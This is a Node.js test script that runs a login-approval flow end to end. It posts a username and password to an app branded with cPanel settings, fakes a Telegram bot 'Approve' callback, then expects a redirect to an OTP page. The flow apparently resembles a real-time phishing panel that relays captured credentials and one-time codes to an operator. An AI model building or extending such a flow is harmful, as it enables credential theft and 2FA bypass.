#!/usr/bin/env node

/**
 * Test Complete Approval Flow
 * This script tests the complete flow from login to approval
 */

const { CPANEL_CONFIG } = require("../src/config/cpanel-config.js");

async function testCompleteFlow() {
  const baseUrl = CPANEL_CONFIG.APP_URL.replace(/\/$/, "");
  const webhookUrl = `${baseUrl}/api/telegram-webhook`;

  console.log("🔄 Testing Complete Approval Flow\n");

  // Step 1: Create a login request
  console.log("1️⃣ Creating login request...");
  const flowId = `test-flow-${Date.now()}`;

  try {
    const loginResponse = await fetch(`${baseUrl}/api/admin-approval`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "application/json",
        Referer: baseUrl,
        Origin: baseUrl,
      },
      body: JSON.stringify({
        flowId: flowId,
        username: "testuser",
        password: "testpass",
        meta: {
          userAgent:
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
      }),
    });

    const loginData = await loginResponse.json();

    if (loginResponse.ok) {
      console.log("   ✅ Login request created successfully");
      console.log("   Flow ID:", flowId);
    } else {
      console.log("   ❌ Login request failed:", loginData);
      return;
    }
  } catch (error) {
    console.log("   ❌ Error creating login request:", error.message);
    return;
  }

  // Step 2: Check if approval is pending
  console.log("\n2️⃣ Checking approval status...");
  try {
    const statusResponse = await fetch(
      `${baseUrl}/api/admin-approval/status?flowId=${flowId}`
    );
    const statusData = await statusResponse.json();

    console.log("   Status Response:", statusData);

    if (statusData.status === "pending") {
      console.log("   ✅ Approval is pending - this is correct");
    } else {
      console.log("   ⚠️ Approval status:", statusData.status);
    }
  } catch (error) {
    console.log("   ❌ Error checking status:", error.message);
  }

  // Step 3: Simulate approve button click
  console.log("\n3️⃣ Simulating approve button click...");
  const approveCallback = {
    callback_query: {
      id: `approve_${Date.now()}`,
      from: {
        id: parseInt(CPANEL_CONFIG.TELEGRAM_CHAT_ID),
        is_bot: false,
        first_name: "Test",
        username: "testuser",
        language_code: "en",
      },
      message: {
        message_id: 89,
        from: {
          id: parseInt(CPANEL_CONFIG.TELEGRAM_BOT_TOKEN.split(":")[0]),
          is_bot: true,
          first_name: "fuck test",
          username: "testthefuckingabilitybot",
        },
        chat: {
          id: parseInt(CPANEL_CONFIG.TELEGRAM_CHAT_ID),
          first_name: "Test",
          username: "testuser",
          type: "private",
        },
        date: Math.floor(Date.now() / 1000),
        text: "Test approval message",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "✅ Approve",
                callback_data: `approve_${flowId}`,
              },
              {
                text: "❌ Disapprove",
                callback_data: `reject_${flowId}`,
              },
            ],
          ],
        },
      },
      chat_instance: "test-instance",
      data: `approve_${flowId}`,
    },
  };

  try {
    const approveResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "TelegramBot (like TwitterBot)",
      },
      body: JSON.stringify(approveCallback),
    });

    const approveData = await approveResponse.json();

    console.log("   Approve Response:", approveData);

    if (approveResponse.ok && approveData.ok) {
      console.log("   ✅ Approve button click processed successfully");
    } else {
      console.log("   ❌ Approve button click failed");
    }
  } catch (error) {
    console.log("   ❌ Error processing approve button:", error.message);
  }

  // Step 4: Check approval status again
  console.log("\n4️⃣ Checking approval status after button click...");
  try {
    // Wait a moment for processing
    await new Promise((resolve) => setTimeout(resolve, 1000));

    const statusResponse = await fetch(
      `${baseUrl}/api/admin-approval/status?flowId=${flowId}`
    );
    const statusData = await statusResponse.json();

    console.log("   Final Status Response:", statusData);

    if (statusData.status === "resolved" && statusData.approved === true) {
      console.log("   ✅ Approval completed successfully!");
      console.log("   User should now be redirected to OTP page");
    } else {
      console.log("   ❌ Approval not completed");
      console.log("   Status:", statusData.status);
      console.log("   Approved:", statusData.approved);
    }
  } catch (error) {
    console.log("   ❌ Error checking final status:", error.message);
  }

  console.log("\n🎯 Complete Flow Test Finished!");
}

// Run the test
testCompleteFlow();
